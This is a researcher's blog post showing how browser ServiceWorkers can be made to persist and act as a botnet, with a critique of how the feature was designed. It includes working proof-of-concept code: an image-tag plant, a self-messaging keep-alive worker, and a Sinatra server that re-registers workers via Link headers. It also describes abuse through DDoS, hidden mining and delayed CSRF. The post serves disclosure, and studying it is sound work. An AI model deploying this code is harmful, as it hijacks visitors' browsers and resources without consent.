---
layout: post
title:  "Building Botnet on ServiceWorkers"
author: "Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)"
public: false
---

TL;DR In this post I will demonstrate one of the numerous ways how ServiceWorkers let us execute Javascript code inifinitely in the browser and will rant a little bit about ServiceWorkers design.

For demonstration <a href="https://jsfiddle.net/Lsd6vgkb/3/">visit this link</a>. Close that tab. Few minutes later open DevTools/Application/ServiceWorkers/Show All and see it running. (could be fixed by now though)

This Catworker runs infinitely, and like a zombie, executes different tasks. No need for a malicious page, just any https:// blog allowing external images in the comments to plant the payload `<img src="https://truefactor.io/cat.gif">`. 

Any web developer would be surprised: <b>How come an image tag leads to JS code execution? How come that JS execution is persistant? I never allowed that!</b>

## ServiceWorkers are overly complex

To make "Progressive" Web Applications popular Chrome team created ServiceWorkers, and they never asked your permission. Currently the only real world use case for that "shiny tech" is to show a Push Notification popup. If you don't believe me, open your registered service workers and inspect their contents. 

Even that simple trick is overcomplicated - <a href="https://developers.google.com/web/updates/2015/03/push-notifications-on-the-open-web#implementing_push_messaging_for_chrome">hunders of lines of code to get started, dependance on FCM etc</a>. 

Put sw.js on the server, register a worker on the client side, wait for a Promise, then serviceWorkerRegistration.pushManager.getSubscription(), extract endpoint and registration_id, save those on the server.

Could be: `navigator.pushManager.getSubscription("We will send you weather updates once an hour").then(function(endpoint){ #FCM endpoint })`

In my humble opinion ServiceWorker is a beautiful answer to non existing question. It is way harder to learn than Appcache while being less secure.

## How to keep it alive for long

ServiceWorker is killed 60 seconds after it receives last event e.g. onmessage, onfetch, onforeignfetch etc

1. postMessage-ing itself

{%highlight ruby%}
self.addEventListener('message', function (event) {
    var spawnNewMessageEvent = function (data) {
        return new Promise(function (success) {
            setTimeout(function () {
                var sw = self.registration.active;
                sw.postMessage(data);
                success("success");
            }, 30000)
        });
    };
    event.waitUntil(doSomething().then(spawnNewMessageEvent));
});
{%endhighlight%}

2. Two workers foreignfetch-ing each other. To use a ForeignFetch you need to <a href="https://bit.ly/OriginTrialSignup">apply for Origin Trial token</a> - entirely automatic process, no review/verification, and allows the attacker to use fresh experimental techniques on real users without their consent.

3. One catworker doing a fetch to cat.gif, which leads to registration of a new worker with different scope (it's called Link-based registration), repeat 55 seconds later. 

{%highlight ruby%}
require 'sinatra'
ot = 'AglMWHYLtMNT8FVZp9u368r0HZPKh7Pjfm7WYEyHwKz4zwaSznv682Bckrz903mz54CVZQACD5ZlSrLpuh8CKQIAAABYeyJvcmlnaW4iOiAiaHR0cHM6Ly90cnVlZmFjdG9yLmlvOjQ0MyIsICJmZWF0dXJlIjogIkZvcmVpZ25GZXRjaCIsICJleHBpcnkiOiAxNDg0OTM2NzI3fQ=='

get "/cat.gif" do
  response.headers['Origin-Trial'] = ot;
  response.headers['Access-Control-Allow-Origin'] = '*';
  response.headers['Link'] = '</sw?'+rand(999999999).to_s+'>; rel="serviceworker"; scope="/'+rand(999999999).to_s+'"'

  if params[:skip]
    'ok'
  else
    response.headers['Content-Type'] = "image/gif"
    File.open('./cat.gif').read
  end
end

get "/sw" do
  response.headers['Content-Type'] = "text/javascript"
  return sw=<<HTML
//#{rand(999999999).to_s}
setTimeout(function(){
  console.log("Forking")
  fetch('https://truefactor.io/cat.gif?skip=1&'+Math.random(9999999));
}, 30000);
HTML
end
{%endhighlight%}

## How it can be abused?

Right now, attackers could benefit from your browser in three quite dangerous ways.

1. DDoS someone (easy to stop by Referer blocklist)

2. memory-hard calculations like scrypt/litecoin mining. I can get only 2000 hashes/sec, but it's completely free and can scale to millions of machines. <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers">Look through other functions</a> available inside of a ServiceWorker.

3. Most dangerous, delayed CSRF. Once you find a CSRF issue on a website you can send a job to all your zombies and abuse their cookies to run some requests on their behalf.

ServiceWorkers == persistance by design. They run after you close the tab, they randomly recieve 'sync' events and wake up, get updated every 24 hours, and if you allowed a website to send Push Notifications, they can also run some JS every time they show a popup. All that stuff is already in production for quite a while. 

There will be more bypasses to keep attacker's code running. This class of bugs doesn't get enough attention from the team. <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=647943">Reports</a> <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=662443">are</a> <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=648836">public</a> and given very low priority.

On top of that, <b>Origin Trials approach is flawed</b> - anyone can get a Token, anyone can abuse an experimental feature. Must be opt-in via flags only.

I strongly believe there should be a way to switch off ServiceWorkers with a flag, because for me, it brings nothing to the table (did you read the Cache docs? it's like rocket science), and I'm not so sure it won't break Same Origin Policy or whatever in the future, since features are rushed to production with little review...  Here are some more low-sev vulnerabilities: <a href="https://tools.cisco.com/security/center/viewAlert.x?alertId=43522">FF</a>, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=422966">JSONP+XSS=takeover</a>, <a href="https://alf.nu/ServiceWorker">easier to take over sandbox domains</a>.